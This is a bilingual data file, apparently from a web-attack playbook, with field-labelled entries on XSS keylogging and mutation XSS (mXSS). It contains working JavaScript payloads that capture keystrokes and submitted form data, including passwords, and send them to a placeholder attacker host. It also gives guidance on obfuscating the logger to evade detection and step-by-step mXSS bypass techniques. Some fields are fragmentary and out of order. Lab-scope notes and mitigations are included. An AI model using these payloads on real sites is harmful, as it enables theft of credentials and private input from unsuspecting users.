mitigation.en: Fix XSS injection points and restrict inline scripts via CSP, keeping credential forms out of injectable render paths; after the fix, replayed listeners must fail to register or exfiltrate, with monitoring alerting on abnormal event-listener registration.

description.zh: 注入按键监听把受害者每次输入立即发往控制端，日志按时间顺序拼接即可还原完整输入内容，先证明捕获通道可用。
description.en: Hook keypress and ship each key instantly; ordered log lines rebuild the typed content and prove the capture channel.

title.en: Buffer and flush input in batches

description.zh: 改为累积缓冲模式，遇回车键才整段外带，请求量骤减更加隐蔽，控制端一次即可拿到受害者的完整输入串内容。
description.en: Buffer keys and flush on Enter to cut request volume and stay quiet while delivering whole input strings at once.

attackChain.payload:
<script>
var buffer = "";
document.addEventListener("keydown", function(e){
  if(e.key === "Enter"){
    new Image().src = "http://{ATTACKER_HOST}/log?data=" + encodeURIComponent(buffer);
    buffer = "";
  } else {
    buffer += e.key;
  }
});
</script>

description.zh: 选中密码类输入框并监听值变化事件，受害者填写的口令被直接外带回收，捕获目标从普通输入内容升级到登录凭据材料。
description.en: Target input[type=password] change events to exfiltrate filled credentials, focusing capture from typing to secrets.

description.zh: 监听表单提交事件以 FormData 打包全部字段一次性外带，登录、改密等整表内容连同操作动作全部落网收割。
description.en: Hook form submit and serialize all fields via FormData so complete login or password-change payloads are captured in one shot.

attackChain.payload:
<script>
document.querySelectorAll("form").forEach(function(form){
  form.addEventListener("submit", function(e){
    var data = new FormData(this);
    new Image().src = "http://{ATTACKER_HOST}/log?" + new URLSearchParams(data).toString();
  });
});
</script>

title.en: Use the obfuscated build to evade detection

description.zh: 检测规则命中监听函数等特征时改用十六进制混淆脚本，函数名与字符串全部编码，监听逻辑保持不变继续收键。
description.en: When signatures like addEventListener trip rules, run the hex-obfuscated script with encoded names but identical listener logic.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 XSS 输入事件访问边界 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for XSS Input-Event Access Boundary are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

analysis.zh: XSS 输入事件访问边界只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: XSS Input-Event Access Boundary is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 键盘记录验证只对实验账户输入合成凭据——真实用户击键不进入收集范围；脚本在验证后从存储点移除。
opsecTips.en: Log synthetic credentials typed by lab accounts only — exclude real users' keystrokes — and remove the script from the storage point after verification.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

description.zh: 以十六进制混淆监听 keydown 外发按键：事件名入表 _0xa[2]，键值取 event.key（_0xa[0]），修复原变体把事件名当属性读取恒为 undefined 的缺陷。判据：收集端收到 ?k=<按键> 请求且值非 undefined。
description.en: Hex-obfuscated keydown listener exfiltrating event.key; the lookup table now separates the event name from the key property, fixing the variant that always beacons ?k=undefined. Success: the collector receives a ?k=<key> request whose value is never undefined.

explanation.zh: hex编码的"key"：KeyboardEvent 键值属性名（event.key）
hex编码的"keydown"：addEventListener 的事件类型参数
explanation.en: Hex-encoded "keydown": the event type passed to addEventListener

explanation.zh: 数组方括号取值隐藏 addEventListener("keydown",...) 真实调用
explanation.en: Bracket access hides the real addEventListener("keydown",...) call

explanation.zh: 取 event.key 外带；原变体误用事件名当属性（event["keydown"] 恒 undefined）
explanation.en: Reads event.key for exfiltration; the old variant read the event name as a property (event["keydown"] is always undefined)

description.zh: 注入 keypress 监听外发击键；收集端按 key 参数收到按键流即确认基础记录链可用。{ATTACKER_HOST} 渲染为自有收集服务器。
description.en: Inject a keypress listener forwarding keystrokes; the keystroke stream arriving under the key parameter confirms the basic logger chain. {ATTACKER_HOST} renders to your collection server.

execution.command:

    buffer += e.key;

description.zh: 缓冲击键并在 Enter 时整段外发；收集端按 data 参数收到整行输入即确认缓冲记录可用。{ATTACKER_HOST} 渲染为自有收集服务器。
description.en: Buffer keystrokes and send the whole line on Enter; the full line arriving under the data parameter confirms buffered logging. {ATTACKER_HOST} renders to your collection server.

explanation.zh: 按下回车时外带缓存的按键数据

description.zh: 监听密码字段 change 事件外发字段值；收集端按 pwd 参数收到密码值即确认表单窃取可用。{ATTACKER_HOST} 渲染为自有收集服务器。
description.en: Listen for change events on password fields and exfiltrate values; the password arriving under the pwd parameter confirms form theft. {ATTACKER_HOST} renders to your collection server.

description.zh: 劫持 form submit 外发完整表单数据；收集端收到表单字段集即确认提交劫持可用。{ATTACKER_HOST} 渲染为自有收集服务器。
description.en: Hijack form submit events and exfiltrate the FormData; the form field set arriving at the collector confirms submit hijacking. {ATTACKER_HOST} renders to your collection server.

name.zh: 浏览器解析突变 XSS

description.zh: 覆盖 mXSS 突变型 XSS 的解析差异验证：从基础突变探测，到 SVG 与 MathML 命名空间下的标签重解析，再到与 DOM clobbering 的组合利用，用于确认净化输出经浏览器二次解析后复活为脚本。
description.en: Covers parsing-differential validation of mutation XSS: from basic mutation probing through tag re-parsing under SVG and MathML namespaces to combined use with DOM clobbering, confirming sanitized output revives as script after browser re-parsing.

overview.zh: 覆盖突变型 XSS（mXSS）的解析差异验证：noscript 解析差异下的属性逃逸、SVG CDATA 与 MathML mglyph/style 命名空间突变、以及 DOM clobbering 组合触发。用于确认净化后的输出经浏览器二次解析复活为可执行脚本。
overview.en: Covers parsing-differential verification for mutation XSS (mXSS): attribute escape under noscript parsing differences, SVG CDATA and MathML mglyph/style namespace mutations, and combined triggering with DOM clobbering. Used to confirm sanitized output reviving as executable script after the browser re-parses it.

vulnerability.zh: 根因是净化器按字符串或静态 DOM 视图处理输出，而浏览器解析器会按命名空间与上下文修复重排标记，SVG/MathML/noscript 等位置的二次解析把无害结构突变回可执行节点；净化模型与解析器语义不一致即构成缺口。
vulnerability.en: The root cause is sanitizers operating on strings or a static DOM view while browser parsers repair and rearrange markup by namespace and context: re-parsing in SVG/MathML/noscript positions mutates harmless structures back into executable nodes. The mismatch between the sanitizer model and parser semantics is the gap.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步提交 noscript 解析差异样例，渲染后 img 载荷执行即确认基础 mXSS；第 2 步以 SVG CDATA 突变验证命名空间复活，第 3 步以 MathML mglyph/style 突变验证对应分支，第 4 步用重复 id 表单配合 DOM clobbering 触发。命中后对比净化前后 DOM 确认突变点。每个阳性样例保留最小复现片段，供修复后回归对照。
exploitation.en: Use in Payload list order: step 1 submits the noscript parsing-differential sample, with the img payload executing after rendering confirming basic mXSS; step 2 verifies namespace revival via SVG CDATA mutation, step 3 the MathML branch via mglyph/style mutation, and step 4 combines duplicate-id forms with DOM clobbering. On a hit, diff pre- and post-sanitization DOMs to pinpoint the mutation. Keep a minimal reproducible fragment per positive sample for post-fix regression comparison.

mitigation.en: Have sanitizers serialize from the final DOM tree and re-verify under browser semantics, forbid suspicious structures inside SVG/MathML namespaces, and fix the DOM clobbering surface from duplicate id/name; after the fix, replayed mutation payloads must remain non-executable after re-parsing.

title.en: Probe mXSS with a noscript mutation

description.zh: 提交嵌套 title 属性的 noscript 载荷，浏览器上下文切换时标签结构被重新解析，原本无害属性重组出可执行 img 事件。
description.en: Submit the noscript payload with a nested title attribute; context switches reparse the DOM and reassemble an executable img event.

description.zh: 在 svg 内嵌 CDATA 包裹载荷，净化器按原始文本处理放行，浏览器二次解析时把内容当节点执行，脚本随之触发执行。
description.en: Wrap payloads in CDATA inside svg; sanitizers see inert text while the browser's second parse turns it into executable nodes.

description.zh: 用 math、mtext、mglyph、style 多层嵌套制造解析分歧，过滤与渲染结果不一致时，注入的 img 事件在浏览器侧执行。
description.en: Stack math, mtext, mglyph and style layers so filtering and rendering disagree; the injected img event executes browser-side.

title.en: Combine with DOM clobbering to trigger

description.zh: 注入重复 id 的 form 元素覆盖全局变量，应用脚本引用被篡改的引用进入异常分支，为载荷执行创造触发条件。
description.en: Inject duplicate-id form elements to clobber globals; application scripts dereference the tampered references into attacker-controlled paths.

description.zh: 在 svg script 内混排十进制与十六进制实体，净化器视其为普通文本，解码后浏览器执行代码，保持突变链路可用。
description.en: Mix decimal and hex entities inside svg script text; sanitizers treat it as text while the decoded result executes in the browser.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 浏览器解析突变 XSS 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Browser Parsing Mutation XSS are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

analysis.zh: 浏览器解析突变 XSS只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: Browser Parsing Mutation XSS is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: mXSS 验证产生的净化器差异只对实验内容断言——不在生产模板上验证突变链。
opsecTips.en: Assert sanitizer differentials against lab content only, and never validate mutation chains on production templates.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

description.en: Exploit noscript parsing differences for attribute breakout; the img payload executing after rendering confirms mXSS.

explanation.zh: 脚本禁用时显示的内容

description.zh: 以 SVG CDATA 突变提交；解析突变后脚本执行即确认 SVG 命名空间 mXSS。
description.en: Submit SVG CDATA mutations; script execution after parser mutation confirms SVG-namespace mXSS.

description.zh: 以 MathML mglyph/style 突变提交；突变后 img 执行即确认 MathML mXSS。
description.en: Submit MathML mglyph/style mutations; img execution after mutation confirms MathML mXSS.

description.zh: 以重复 id 表单触发 DOM clobbering 配合载荷；覆盖生效并执行即确认 clobbering 可助攻触发。
description.en: Trigger DOM clobbering with duplicate-id forms alongside the payload; the override taking effect and firing confirms clobbering assists execution.
